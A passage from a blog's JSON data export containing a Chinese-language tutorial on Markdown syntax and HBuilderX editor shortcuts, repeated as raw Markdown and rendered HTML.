Ctrl+=可逐级放大选区\n\t* 双击标题、列表符可选中相应段落\n\t* 双击英文引号、括号内侧，可选中内部内容\n\t* 双击缩进符，可选中同缩进段落\n\t* 双击连字符比如-或_，可选中相连的词，比如双击这里试试，uni-app\n- 查找\n\t* Ctrl+P查找文件\n\t* Ctrl+Alt+F可在当前目录的所有文档中搜索指定关键字(mac是Command+Shift+f)\n\t* 选中文字按F3，查找下一个，Shift+F3找上一个\n- 云同步：HBuilderX+markdown用于云同步笔记的技巧，请参考[http://ask.dcloud.net.cn/article/13097](http://ask.dcloud.net.cn/article/13097)\n\n都学会了吗？\nmarkdown语法其实很简单，认真学半小时就能掌握。\nHBuilderX的极客操作则需要不停反复练习，熟练掌握这些技巧，你将成为高效极客！\n\n","source":"_posts/Markdown_HBuilderX.md","raw":"---\ntitle: Markdown_doc_for_HBulider\ndate: 2020/10/21 9:08:28\ncomments: ture\ncategories:\n- Markdown\ntags:\n- Markdown\n---\n\n\n\n# markdown - 更简洁、更高效\n\n=================================================\n\n强烈建议开发者认真阅读本文档，掌握md及HBuilderX对md的强大支持。\n_窄屏幕下，可按Alt+滚轮横向滚动_\n\n<!--more-->\n\n很多人只把markdown用于网络文章发表，这糟蹋了markdown。\nmarkdown不止是HTML的简化版，更重要的是txt的升级版、word的轻量版、笔记的最佳载体。\n作为一种简单的格式标记语言，不同于txt的无格式，不同于HTML的复杂标记，也不同于word的鼠标调整样式。markdown通过简单的几个字符键入，就可以快捷的定义文档的样式。\n比如在行首敲一个“#”，就把这行定义为了1级标题，并且在HBuilderX里有直观完善的着色，这样无需发布为web页面，可直接当word用。\n掌握markdown，你可以完全抛弃txt和笔记软件的编辑器，并且在大多数场景下替代掉复杂臃肿的word。享受简洁之美、享受效率提升。\n而HBuilderX，可以被称为最强大的markdown书写工具了。\n\n下面的示例列举了markdown语法及对应的HBuilderX使用技巧：\n\n开始前，可以先按下文档结构图的快捷键Alt+w（Mac是Ctrl+w），浏览本文的大纲。\n\n# 标题语法\nmarkdown的标题是行首以#号开头，空格分割的，不同级别的标题，在HX里着色也不同。如下：\n# 标题1\n## 标题2\n### 标题3\n#### 标题4\n##### 标题5\n###### 标题6\n\n标题使用技巧：\n1. Emmet快速输入：敲h2+Tab即可生成二级标题【同HTML里的emmet写法，不止标题，HX里所有可对应tag的markdown语法均支持emmet写法】。仅行首生效\n2. 智能双击：双击#号可选中整个标题段落\n3. 智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动在下一行补#。而连续2次回车后将自动补的#去掉。(体验同word)\n4. 回车后再次按Tab可递进一层标题，再按Tab切换列表符\n5. 在# 后回车，可上插一个空标题行【同word】，或任意位置按Ctrl+Shift+Enter也可以上插空标题行\n6. 折叠：\n\t- 点标题前的-号可折叠该标题段落，快捷键是Alt+-（展开折叠是Alt+=）\n\t- 多层折叠时折叠或展开子节点，快捷键是Alt+Shift+-或=\n\t- 全文全部折叠或展开，快捷键是Ctrl+Alt+Shift+-或=\n\t- 折叠其他区域，快捷键是Alt+Shift+o。这对长文档管理非常有用，可以专注于当前章节\n\t- 可以在菜单-跳转-折叠中随时找到这些功能\n\n# 列表\nmarkdown的列表支持有序列表、无序列表以及特殊的任务列表。\n同样也是在行前加一个特殊符号，并空格后再跟列表文字内容。\n\n## 有序列表\n有序列表就是有顺序的列表，依靠行前的数字标记顺序。\n1. 有序列表1 【设置或取消有序列表符的快捷键：Ctrl+Alt+1，可选中多行批量设置序号；支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标】\n2. 有序列表2 【列表后回车会自动补序号】\n4. 有序列表3 【智能双击：双击前面的数字，可重新对数字排序，修正序号错误，并选中有序列表段落（左边的4是故意写错让你体验的）】\n\n## 无序列表\n无序列表就是列表不排序，无序列表因书写随意而被更广泛的使用。\n无序列表有3种前缀，HX里分别用于表示1级列表、2级列表、3级列表。\n- 无序列表1 【快捷键：Ctrl+Alt+-；智能双击：双击-号可选中整段无序列表；再次按Tab会更换二级列表符】\n* 无序列表2\t\n\t* Emmet：li后敲Tab可生成*号列表符，行首生效\n\t* 快捷键：Ctrl+Alt+8【8即*对应的数字】，支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标\n\t* 智能双击：双击*号可选中整段无序列表\n\t* 智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；再次按Tab会更换列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符\n\t* *号常用于二级列表，列表符后继续Tab，可切换列表符\n+ 无序列表3 【快捷键：Ctrl+Alt+=；常用于三级列表；其他同上】\n\n## 任务列表\n任务列表非常实用，管理待办、已办非常便利。\n[ ] 任务列表-未完成任务 【快捷键：Ctrl+Alt+[】\n[x] 任务列表-已完成任务 【快捷键：Ctrl+Alt+]】\n\t1. 智能双击：双击方括号内可切换勾选状态，把任务标记为完成或未完成；双击方括号右侧可选中任务列表段落\n\t2. 智能回车：回车后自动补任务列表前缀符号；连续按回车清除前缀符号；在列表符后回车或行尾Shift+回车，上一行留出列表符\n- [ ] 如需发布到web渲染，需增加无序列表- 的前缀\n\n以上三种列表，均支持批量修改列表符，有如下方式建议依次学习尝试：\n1. 选中多行，按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，批量设置列表符\n2. 如果需要跳行设置有序或无序列表，通过Ctrl+鼠标左键点中目标多行（可不连续），产生多光标，然后按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，可跳行设置列表符，尤其是有序列表，数字也会跳行加1\n3. 按Alt+鼠标选中行首那列（列选择），这样每行行首都有光标，然后再键入或删除列表符即可批量操作\n4. 选中多行，按快捷键Ctrl+Shift+\\（其实就是Ctrl+|），可以在每行行首添加一个光标\n\n## 引用列表\n> 引用1\n> 引用2\n快捷键：Ctrl+Alt+Shift+.\n智能双击：双击>号可选中整段引用列表\n智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符\n\n# 文字样式语法\n**加粗** 【快捷键：Ctrl+B，支持多光标；Emmet：b后敲Tab】\n__加粗2__\n_倾斜_【Emmet：i后敲Tab；前后包围：选中文字按Ctrl+\\是在选区两侧添加光标，可以继续输入_】\n*倾斜*\n~~删除线~~\n``` 单行代码 ```\n包围插入：先选中文字内容，然后按_*~`等符号，会自动在2侧加包围\n智能双击：双击语法区前面的定义符号，选中包含定义符的整段文字\n去包围：选中整段文字后，按Ctrl+Shift+]，可去除2侧包围符号\n\n引号括号虽然不属于markdown语法，但也支持相同的包围、选择、去包围操作。\n引号括号智能双击选择时略特殊的是：双击引号括号内侧，选中引号括号里的内容(不含引号括号)；按下Alt+双击引号括号内侧，则选中包含符号的整段文字\n\nHBuilderX还支持以下对2侧文本高效处理的手段\n1. 选中文字按Ctrl+\\是在选区两侧添加光标，可以继续输入~~，会在2侧同时输入\n2. 向2侧扩大选择：【Win:Alt+Shit+→ 、Mac:Ctrl++Shit+→】；由2侧向内减少选择：【Win:Alt+Shit+← 、Mac:Ctrl++Shit+←】\n\n[链接文字](http://dcloud.io)\n1. Emmet：a后敲Tab\n2. 打开链接：Alt+鼠标单击；如果是本地文件，可通过Shift+Alt+单击，在另一分栏打开文件\n3. 智能粘贴：粘贴URL会自动变成超链接格式；粘贴本地文件进来也会自动创建引用链接\n4. 智能双击：双击语法区开头，即[左侧，选中包含定义符的整段文字\n\n![图片描述文字](logo.jpg)\n1. Emmet：img后敲Tab\n2. 智能粘贴：粘贴剪切板里的图形时会自动保存为本md文档的附件；删除文档中的图片语法，保存md文档时会自动删除对应的图片附件；粘贴图片文件时自动变成链接引用格式；\n3. 悬浮预览：鼠标移到图片语法上，本地图片会自动显示出来\n4. 智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字\n\n# 表格 \n\n|\t\t|\t\t|\t\t|\n|--\t|--\t|--\t|\n|\t\t|\t\t|\t\t|\n|\t\t|\t\t|\t\t|\n\n1. Emmet：table3*3后敲Tab，表示生成3行3列的表格，行首生效\n2. md表格对齐是传统md的痛点，按下Ctrl+K可以自动整理表格格式（暂未兼容不同缩放模式和字体的情况）\n3. 支持从excel、wps、word、number的表格中复制粘贴表格进来（不支持合并单元格和单元格换行）\n\n# 分割线\n------------- 【Emmet：hr后敲Tab】\n*************\n=============\n\n# 代码区\n``` javascript\n\tvar a = document\n```\nEmmet：code后敲Tab，行首生效\n智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字\n支持代码直接高亮着色，这应该是只有HBuilderX才有的功能。注意需要在代码区开头指定语言类型\n\n# 注释\n<!--注释--> \n快捷键：Ctrl+/\n智能双击：双击注释首尾的定义符，选中整段注释\n\n# 其他emmet快捷输入\nday后敲Tab，当前日期。注意day需在行首或前面有空格\ntime后敲Tab，当前时间。注意time需在行首或前面有空格\n\n# 文档结构图\n文章很长时，word里有文档结构图，HBuilderX也有。\n菜单视图-文档结构图，快捷键Alt+W(mac是ctrl+W)，轻松管理长文档\n\n# 运行、预览和打印PDF\n对md文件点工具栏或菜单里的浏览器运行，可以使用外部浏览器预览此md文件，会自动渲染为HTML。\n点右上角的预览【快捷键Alt+p】，可在HBuilderX右侧预览该md文档的HTML渲染结果。\n在浏览器中点打印，选择打印到PDF，可将md输出为PDF格式。（注意在打印选项里去掉页眉页脚）\n\n# 其他常用但你可能不知道的快捷操作技巧\n- Ctrl+鼠标左键添加多光标，然后敲字或粘贴，可批量处理。Ctrl+鼠标左键拖选，可选中多个选区。\n- Ctrl+鼠标右键删除多光标\n- 不选内容按Ctrl+C或X可复制或剪切整行\n- 选中2个选区后，按Ctrl+Shift+X，可互换选区内容。如无选区，只是2个光标，则互换2行\n- Ctrl+上下键可上下移动行\n- Ctrl+Insert可重复插入当前行，如果有选中内容，可重复插入选中内容\n- Ctrl+Shift+K可合并多行（是格式化Ctrl+K的反操作）\n- 删除\n\t* 按Ctrl+D可删除选中行，支持多光标\n\t* Shift+Del删除到行尾\n\t* Shift+Backspace删除到行首\n- 选择\n\t* Ctrl+E选相同词(mac是Command+D)，连续按可选中多词进一步操作，比替换更方便\n\t* Ctrl+L可连选多行，Ctrl+Shift+L也是选择行，但不选行首尾的空白字符\n\t* Ctrl+=可逐级放大选区\n\t* 双击标题、列表符可选中相应段落\n\t* 双击英文引号、括号内侧，可选中内部内容\n\t* 双击缩进符，可选中同缩进段落\n\t* 双击连字符比如-或_，可选中相连的词，比如双击这里试试，uni-app\n- 查找\n\t* Ctrl+P查找文件\n\t* Ctrl+Alt+F可在当前目录的所有文档中搜索指定关键字(mac是Command+Shift+f)\n\t* 选中文字按F3，查找下一个，Shift+F3找上一个\n- 云同步：HBuilderX+markdown用于云同步笔记的技巧，请参考[http://ask.dcloud.net.cn/article/13097](http://ask.dcloud.net.cn/article/13097)\n\n都学会了吗？\nmarkdown语法其实很简单，认真学半小时就能掌握。\nHBuilderX的极客操作则需要不停反复练习，熟练掌握这些技巧，你将成为高效极客！\n\n","slug":"Markdown_HBuilderX","published":1,"updated":"2021-03-24T04:15:01.937Z","layout":"post","photos":[],"link":"","_id":"ckq3bl41z0009dsvt7nd466qn","content":"<h1 id=\"markdown-更简洁、更高效\"><a href=\"#markdown-更简洁、更高效\" class=\"headerlink\" title=\"markdown - 更简洁、更高效\"></a>markdown - 更简洁、更高效</h1><p>=================================================</p>\n<p>强烈建议开发者认真阅读本文档，掌握md及HBuilderX对md的强大支持。<br><em>窄屏幕下，可按Alt+滚轮横向滚动</em></p>\n<span id=\"more\"></span>\n\n<p>很多人只把markdown用于网络文章发表，这糟蹋了markdown。<br>markdown不止是HTML的简化版，更重要的是txt的升级版、word的轻量版、笔记的最佳载体。<br>作为一种简单的格式标记语言，不同于txt的无格式，不同于HTML的复杂标记，也不同于word的鼠标调整样式。markdown通过简单的几个字符键入，就可以快捷的定义文档的样式。<br>比如在行首敲一个“#”，就把这行定义为了1级标题，并且在HBuilderX里有直观完善的着色，这样无需发布为web页面，可直接当word用。<br>掌握markdown，你可以完全抛弃txt和笔记软件的编辑器，并且在大多数场景下替代掉复杂臃肿的word。享受简洁之美、享受效率提升。<br>而HBuilderX，可以被称为最强大的markdown书写工具了。</p>\n<p>下面的示例列举了markdown语法及对应的HBuilderX使用技巧：</p>\n<p>开始前，可以先按下文档结构图的快捷键Alt+w（Mac是Ctrl+w），浏览本文的大纲。</p>\n<h1 id=\"标题语法\"><a href=\"#标题语法\" class=\"headerlink\" title=\"标题语法\"></a>标题语法</h1><p>markdown的标题是行首以#号开头，空格分割的，不同级别的标题，在HX里着色也不同。如下：</p>\n<h1 id=\"标题1\"><a href=\"#标题1\" class=\"headerlink\" title=\"标题1\"></a>标题1</h1><h2 id=\"标题2\"><a href=\"#标题2\" class=\"headerlink\" title=\"标题2\"></a>标题2</h2><h3 id=\"标题3\"><a href=\"#标题3\" class=\"headerlink\" title=\"标题3\"></a>标题3</h3><h4 id=\"标题4\"><a href=\"#标题4\" class=\"headerlink\" title=\"标题4\"></a>标题4</h4><h5 id=\"标题5\"><a href=\"#标题5\" class=\"headerlink\" title=\"标题5\"></a>标题5</h5><h6 id=\"标题6\"><a href=\"#标题6\" class=\"headerlink\" title=\"标题6\"></a>标题6</h6><p>标题使用技巧：</p>\n<ol>\n<li>Emmet快速输入：敲h2+Tab即可生成二级标题【同HTML里的emmet写法，不止标题，HX里所有可对应tag的markdown语法均支持emmet写法】。仅行首生效</li>\n<li>智能双击：双击#号可选中整个标题段落</li>\n<li>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动在下一行补#。而连续2次回车后将自动补的#去掉。(体验同word)</li>\n<li>回车后再次按Tab可递进一层标题，再按Tab切换列表符</li>\n<li>在# 后回车，可上插一个空标题行【同word】，或任意位置按Ctrl+Shift+Enter也可以上插空标题行</li>\n<li>折叠：<ul>\n<li>点标题前的-号可折叠该标题段落，快捷键是Alt+-（展开折叠是Alt+=）</li>\n<li>多层折叠时折叠或展开子节点，快捷键是Alt+Shift+-或=</li>\n<li>全文全部折叠或展开，快捷键是Ctrl+Alt+Shift+-或=</li>\n<li>折叠其他区域，快捷键是Alt+Shift+o。这对长文档管理非常有用，可以专注于当前章节</li>\n<li>可以在菜单-跳转-折叠中随时找到这些功能</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h1><p>markdown的列表支持有序列表、无序列表以及特殊的任务列表。<br>同样也是在行前加一个特殊符号，并空格后再跟列表文字内容。</p>\n<h2 id=\"有序列表\"><a href=\"#有序列表\" class=\"headerlink\" title=\"有序列表\"></a>有序列表</h2><p>有序列表就是有顺序的列表，依靠行前的数字标记顺序。</p>\n<ol>\n<li>有序列表1 【设置或取消有序列表符的快捷键：Ctrl+Alt+1，可选中多行批量设置序号；支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标】</li>\n<li>有序列表2 【列表后回车会自动补序号】</li>\n<li>有序列表3 【智能双击：双击前面的数字，可重新对数字排序，修正序号错误，并选中有序列表段落（左边的4是故意写错让你体验的）】</li>\n</ol>\n<h2 id=\"无序列表\"><a href=\"#无序列表\" class=\"headerlink\" title=\"无序列表\"></a>无序列表</h2><p>无序列表就是列表不排序，无序列表因书写随意而被更广泛的使用。<br>无序列表有3种前缀，HX里分别用于表示1级列表、2级列表、3级列表。</p>\n<ul>\n<li>无序列表1 【快捷键：Ctrl+Alt+-；智能双击：双击-号可选中整段无序列表；再次按Tab会更换二级列表符】</li>\n</ul>\n<ul>\n<li>无序列表2    <ul>\n<li>Emmet：li后敲Tab可生成*号列表符，行首生效</li>\n<li>快捷键：Ctrl+Alt+8【8即*对应的数字】，支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标</li>\n<li>智能双击：双击*号可选中整段无序列表</li>\n<li>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；再次按Tab会更换列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符</li>\n<li>*号常用于二级列表，列表符后继续Tab，可切换列表符</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>无序列表3 【快捷键：Ctrl+Alt+=；常用于三级列表；其他同上】</li>\n</ul>\n<h2 id=\"任务列表\"><a href=\"#任务列表\" class=\"headerlink\" title=\"任务列表\"></a>任务列表</h2><p>任务列表非常实用，管理待办、已办非常便利。<br>[ ] 任务列表-未完成任务 【快捷键：Ctrl+Alt+[】<br>[x] 任务列表-已完成任务 【快捷键：Ctrl+Alt+]】<br>    1. 智能双击：双击方括号内可切换勾选状态，把任务标记为完成或未完成；双击方括号右侧可选中任务列表段落<br>    2. 智能回车：回车后自动补任务列表前缀符号；连续按回车清除前缀符号；在列表符后回车或行尾Shift+回车，上一行留出列表符</p>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 如需发布到web渲染，需增加无序列表- 的前缀</li>\n</ul>\n<p>以上三种列表，均支持批量修改列表符，有如下方式建议依次学习尝试：</p>\n<ol>\n<li>选中多行，按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，批量设置列表符</li>\n<li>如果需要跳行设置有序或无序列表，通过Ctrl+鼠标左键点中目标多行（可不连续），产生多光标，然后按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，可跳行设置列表符，尤其是有序列表，数字也会跳行加1</li>\n<li>按Alt+鼠标选中行首那列（列选择），这样每行行首都有光标，然后再键入或删除列表符即可批量操作</li>\n<li>选中多行，按快捷键Ctrl+Shift+\\（其实就是Ctrl+|），可以在每行行首添加一个光标</li>\n</ol>\n<h2 id=\"引用列表\"><a href=\"#引用列表\" class=\"headerlink\" title=\"引用列表\"></a>引用列表</h2><blockquote>\n<p>引用1<br>引用2<br>快捷键：Ctrl+Alt+Shift+.<br>智能双击：双击&gt;号可选中整段引用列表<br>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符</p>\n</blockquote>\n<h1 id=\"文字样式语法\"><a href=\"#文字样式语法\" class=\"headerlink\" title=\"文字样式语法\"></a>文字样式语法</h1><p><strong>加粗</strong> 【快捷键：Ctrl+B，支持多光标；Emmet：b后敲Tab】<br><strong>加粗2</strong><br><em>倾斜_【Emmet：i后敲Tab；前后包围：选中文字按Ctrl+\\是在选区两侧添加光标，可以继续输入_】<br><em>倾斜</em><br><del>删除线</del><br><code>单行代码</code><br>包围插入：先选中文字内容，然后按</em>*~`等符号，会自动在2侧加包围<br>智能双击：双击语法区前面的定义符号，选中包含定义符的整段文字<br>去包围：选中整段文字后，按Ctrl+Shift+]，可去除2侧包围符号</p>\n<p>引号括号虽然不属于markdown语法，但也支持相同的包围、选择、去包围操作。<br>引号括号智能双击选择时略特殊的是：双击引号括号内侧，选中引号括号里的内容(不含引号括号)；按下Alt+双击引号括号内侧，则选中包含符号的整段文字</p>\n<p>HBuilderX还支持以下对2侧文本高效处理的手段</p>\n<ol>\n<li>选中文字按Ctrl+\\是在选区两侧添加光标，可以继续输入~~，会在2侧同时输入</li>\n<li>向2侧扩大选择：【Win:Alt+Shit+→ 、Mac:Ctrl++Shit+→】；由2侧向内减少选择：【Win:Alt+Shit+← 、Mac:Ctrl++Shit+←】</li>\n</ol>\n<p><a href=\"http://dcloud.io\">链接文字</a></p>\n<ol>\n<li>Emmet：a后敲Tab</li>\n<li>打开链接：Alt+鼠标单击；如果是本地文件，可通过Shift+Alt+单击，在另一分栏打开文件</li>\n<li>智能粘贴：粘贴URL会自动变成超链接格式；粘贴本地文件进来也会自动创建引用链接</li>\n<li>智能双击：双击语法区开头，即[左侧，选中包含定义符的整段文字</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"logo.jpg\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"图片描述文字\"></p>\n<ol>\n<li>Emmet：img后敲Tab</li>\n<li>智能粘贴：粘贴剪切板里的图形时会自动保存为本md文档的附件；删除文档中的图片语法，保存md文档时会自动删除对应的图片附件；粘贴图片文件时自动变成链接引用格式；</li>\n<li>悬浮预览：鼠标移到图片语法上，本地图片会自动显示出来</li>\n<li>智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字</li>\n</ol>\n<h1 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h1><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<ol>\n<li>Emmet：table3*3后敲Tab，表示生成3行3列的表格，行首生效</li>\n<li>md表格对齐是传统md的痛点，按下Ctrl+K可以自动整理表格格式（暂未兼容不同缩放模式和字体的情况）</li>\n<li>支持从excel、wps、word、number的表格中复制粘贴表格进来（不支持合并单元格和单元格换行）</li>\n</ol>\n<h1 id=\"分割线\"><a href=\"#分割线\" class=\"headerlink\" title=\"分割线\"></a>分割线</h1><p>————- 【Emmet：hr后敲Tab】</p>\n<hr>\n<p>=============</p>\n<h1 id=\"代码区\"><a href=\"#代码区\" class=\"headerlink\" title=\"代码区\"></a>代码区</h1><pre><code class=\"javascript\">    var a = document</code></pre>\n<p>Emmet：code后敲Tab，行首生效<br>智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字<br>支持代码直接高亮着色，这应该是只有HBuilderX才有的功能。注意需要在代码区开头指定语言类型</p>\n<h1 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h1><!--注释--> \n<p>快捷键：Ctrl+/<br>智能双击：双击注释首尾的定义符，选中整段注释</p>\n<h1 id=\"其他emmet快捷输入\"><a href=\"#其他emmet快捷输入\" class=\"headerlink\" title=\"其他emmet快捷输入\"></a>其他emmet快捷输入</h1><p>day后敲Tab，当前日期。注意day需在行首或前面有空格<br>time后敲Tab，当前时间。注意time需在行首或前面有空格</p>\n<h1 id=\"文档结构图\"><a href=\"#文档结构图\" class=\"headerlink\" title=\"文档结构图\"></a>文档结构图</h1><p>文章很长时，word里有文档结构图，HBuilderX也有。<br>菜单视图-文档结构图，快捷键Alt+W(mac是ctrl+W)，轻松管理长文档</p>\n<h1 id=\"运行、预览和打印PDF\"><a href=\"#运行、预览和打印PDF\" class=\"headerlink\" title=\"运行、预览和打印PDF\"></a>运行、预览和打印PDF</h1><p>对md文件点工具栏或菜单里的浏览器运行，可以使用外部浏览器预览此md文件，会自动渲染为HTML。<br>点右上角的预览【快捷键Alt+p】，可在HBuilderX右侧预览该md文档的HTML渲染结果。<br>在浏览器中点打印，选择打印到PDF，可将md输出为PDF格式。（注意在打印选项里去掉页眉页脚）</p>\n<h1 id=\"其他常用但你可能不知道的快捷操作技巧\"><a href=\"#其他常用但你可能不知道的快捷操作技巧\" class=\"headerlink\" title=\"其他常用但你可能不知道的快捷操作技巧\"></a>其他常用但你可能不知道的快捷操作技巧</h1><ul>\n<li>Ctrl+鼠标左键添加多光标，然后敲字或粘贴，可批量处理。Ctrl+鼠标左键拖选，可选中多个选区。</li>\n<li>Ctrl+鼠标右键删除多光标</li>\n<li>不选内容按Ctrl+C或X可复制或剪切整行</li>\n<li>选中2个选区后，按Ctrl+Shift+X，可互换选区内容。如无选区，只是2个光标，则互换2行</li>\n<li>Ctrl+上下键可上下移动行</li>\n<li>Ctrl+Insert可重复插入当前行，如果有选中内容，可重复插入选中内容</li>\n<li>Ctrl+Shift+K可合并多行（是格式化Ctrl+K的反操作）</li>\n<li>删除<ul>\n<li>按Ctrl+D可删除选中行，支持多光标</li>\n<li>Shift+Del删除到行尾</li>\n<li>Shift+Backspace删除到行首</li>\n</ul>\n</li>\n<li>选择<ul>\n<li>Ctrl+E选相同词(mac是Command+D)，连续按可选中多词进一步操作，比替换更方便</li>\n<li>Ctrl+L可连选多行，Ctrl+Shift+L也是选择行，但不选行首尾的空白字符</li>\n<li>Ctrl+=可逐级放大选区</li>\n<li>双击标题、列表符可选中相应段落</li>\n<li>双击英文引号、括号内侧，可选中内部内容</li>\n<li>双击缩进符，可选中同缩进段落</li>\n<li>双击连字符比如-或_，可选中相连的词，比如双击这里试试，uni-app</li>\n</ul>\n</li>\n<li>查找<ul>\n<li>Ctrl+P查找文件</li>\n<li>Ctrl+Alt+F可在当前目录的所有文档中搜索指定关键字(mac是Command+Shift+f)</li>\n<li>选中文字按F3，查找下一个，Shift+F3找上一个</li>\n</ul>\n</li>\n<li>云同步：HBuilderX+markdown用于云同步笔记的技巧，请参考<a href=\"http://ask.dcloud.net.cn/article/13097\">http://ask.dcloud.net.cn/article/13097</a></li>\n</ul>\n<p>都学会了吗？<br>markdown语法其实很简单，认真学半小时就能掌握。<br>HBuilderX的极客操作则需要不停反复练习，熟练掌握这些技巧，你将成为高效极客！</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"markdown-更简洁、更高效\"><a href=\"#markdown-更简洁、更高效\" class=\"headerlink\" title=\"markdown - 更简洁、更高效\"></a>markdown - 更简洁、更高效</h1><p>=================================================</p>\n<p>强烈建议开发者认真阅读本文档，掌握md及HBuilderX对md的强大支持。<br><em>窄屏幕下，可按Alt+滚轮横向滚动</em></p>","more":"<p>很多人只把markdown用于网络文章发表，这糟蹋了markdown。<br>markdown不止是HTML的简化版，更重要的是txt的升级版、word的轻量版、笔记的最佳载体。<br>作为一种简单的格式标记语言，不同于txt的无格式，不同于HTML的复杂标记，也不同于word的鼠标调整样式。markdown通过简单的几个字符键入，就可以快捷的定义文档的样式。<br>比如在行首敲一个“#”，就把这行定义为了1级标题，并且在HBuilderX里有直观完善的着色，这样无需发布为web页面，可直接当word用。<br>掌握markdown，你可以完全抛弃txt和笔记软件的编辑器，并且在大多数场景下替代掉复杂臃肿的word。享受简洁之美、享受效率提升。<br>而HBuilderX，可以被称为最强大的markdown书写工具了。</p>\n<p>下面的示例列举了markdown语法及对应的HBuilderX使用技巧：</p>\n<p>开始前，可以先按下文档结构图的快捷键Alt+w（Mac是Ctrl+w），浏览本文的大纲。</p>\n<h1 id=\"标题语法\"><a href=\"#标题语法\" class=\"headerlink\" title=\"标题语法\"></a>标题语法</h1><p>markdown的标题是行首以#号开头，空格分割的，不同级别的标题，在HX里着色也不同。如下：</p>\n<h1 id=\"标题1\"><a href=\"#标题1\" class=\"headerlink\" title=\"标题1\"></a>标题1</h1><h2 id=\"标题2\"><a href=\"#标题2\" class=\"headerlink\" title=\"标题2\"></a>标题2</h2><h3 id=\"标题3\"><a href=\"#标题3\" class=\"headerlink\" title=\"标题3\"></a>标题3</h3><h4 id=\"标题4\"><a href=\"#标题4\" class=\"headerlink\" title=\"标题4\"></a>标题4</h4><h5 id=\"标题5\"><a href=\"#标题5\" class=\"headerlink\" title=\"标题5\"></a>标题5</h5><h6 id=\"标题6\"><a href=\"#标题6\" class=\"headerlink\" title=\"标题6\"></a>标题6</h6><p>标题使用技巧：</p>\n<ol>\n<li>Emmet快速输入：敲h2+Tab即可生成二级标题【同HTML里的emmet写法，不止标题，HX里所有可对应tag的markdown语法均支持emmet写法】。仅行首生效</li>\n<li>智能双击：双击#号可选中整个标题段落</li>\n<li>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动在下一行补#。而连续2次回车后将自动补的#去掉。(体验同word)</li>\n<li>回车后再次按Tab可递进一层标题，再按Tab切换列表符</li>\n<li>在# 后回车，可上插一个空标题行【同word】，或任意位置按Ctrl+Shift+Enter也可以上插空标题行</li>\n<li>折叠：<ul>\n<li>点标题前的-号可折叠该标题段落，快捷键是Alt+-（展开折叠是Alt+=）</li>\n<li>多层折叠时折叠或展开子节点，快捷键是Alt+Shift+-或=</li>\n<li>全文全部折叠或展开，快捷键是Ctrl+Alt+Shift+-或=</li>\n<li>折叠其他区域，快捷键是Alt+Shift+o。这对长文档管理非常有用，可以专注于当前章节</li>\n<li>可以在菜单-跳转-折叠中随时找到这些功能</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h1><p>markdown的列表支持有序列表、无序列表以及特殊的任务列表。<br>同样也是在行前加一个特殊符号，并空格后再跟列表文字内容。</p>\n<h2 id=\"有序列表\"><a href=\"#有序列表\" class=\"headerlink\" title=\"有序列表\"></a>有序列表</h2><p>有序列表就是有顺序的列表，依靠行前的数字标记顺序。</p>\n<ol>\n<li>有序列表1 【设置或取消有序列表符的快捷键：Ctrl+Alt+1，可选中多行批量设置序号；支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标】</li>\n<li>有序列表2 【列表后回车会自动补序号】</li>\n<li>有序列表3 【智能双击：双击前面的数字，可重新对数字排序，修正序号错误，并选中有序列表段落（左边的4是故意写错让你体验的）】</li>\n</ol>\n<h2 id=\"无序列表\"><a href=\"#无序列表\" class=\"headerlink\" title=\"无序列表\"></a>无序列表</h2><p>无序列表就是列表不排序，无序列表因书写随意而被更广泛的使用。<br>无序列表有3种前缀，HX里分别用于表示1级列表、2级列表、3级列表。</p>\n<ul>\n<li>无序列表1 【快捷键：Ctrl+Alt+-；智能双击：双击-号可选中整段无序列表；再次按Tab会更换二级列表符】</li>\n</ul>\n<ul>\n<li>无序列表2    